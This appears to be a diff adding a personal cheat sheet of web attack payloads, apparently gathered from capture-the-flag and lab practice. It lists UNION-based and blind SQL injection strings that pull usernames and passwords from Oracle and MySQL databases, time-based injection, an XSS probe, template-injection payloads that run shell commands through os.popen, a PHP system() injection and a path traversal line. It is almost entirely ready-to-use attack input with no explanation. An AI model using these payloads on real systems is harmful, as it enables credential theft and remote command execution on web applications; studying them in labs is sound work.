@@ -1,0 +1,49 @@
+gobuster
+exiftool
+tshark -Y "mysql contains db_m3149.users" -r capture.pcap -Tjson --no-duplicate-keys > result.json
+python ./sf.py -l 127.0.0.1:5001
+cd ../../../ & more /*
+netstat -ntu -4 -6 |  awk '/^tcp/{ print $5 }' | sed -r 's/:[0-9]+$//' |  sort | uniq -c | sort -n
+
+' order by 3 --
+'+UNION+SELECT+'abcdef',NULL,NULL--
+multiple values in a single column  -->  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+check version   Oracle              -->  '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+                MySQL and Mincrosoft-->  '+UNION+SELECT+@@version,+NULL#
+
+content non-Oracle -->'+UNION+SELECT+'abc','def'#                   
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+content Oracle     -->'+UNION+SELECT+'abc','def'+FROM+dual--               
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+
+other table        
+'+UNION+SELECT+username,+password+FROM+users--
+
+' || (SELECT sleep(10))
+
+UNION SELECT table_name FROM information_schema.tables WHERE table_name like "%flag%"-- -
+UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
+UNION SELECT flag_3e53dc FROM flag_304ad593-- -
+
+BobbySinclusto’ and (Select LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database()) > 1#
+BobbySinclusto’ and (Select SUBSTRING(table_name,1,5) FROM information_schema.tables WHERE table_schema=database()) like “users”#
+BobbySinclusto’ and (Select LENGTH(password) FROM users WHERE username like “BobbySinclusto”) > 1#
+BobbySinclusto’ and (Select LENGTH(password) FROM users WHERE username like “BobbySinclusto”) > 1#
+BobbySinclusto’ and (Select SUBSTRING(password,$1$,1) FROM users WHERE username like “BobbySinclusto”) like “$a$”#
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+
+<img src=x onerror=alert()>
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('Is').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
+${system($_GET[1])}&1=cat+flagepfnx
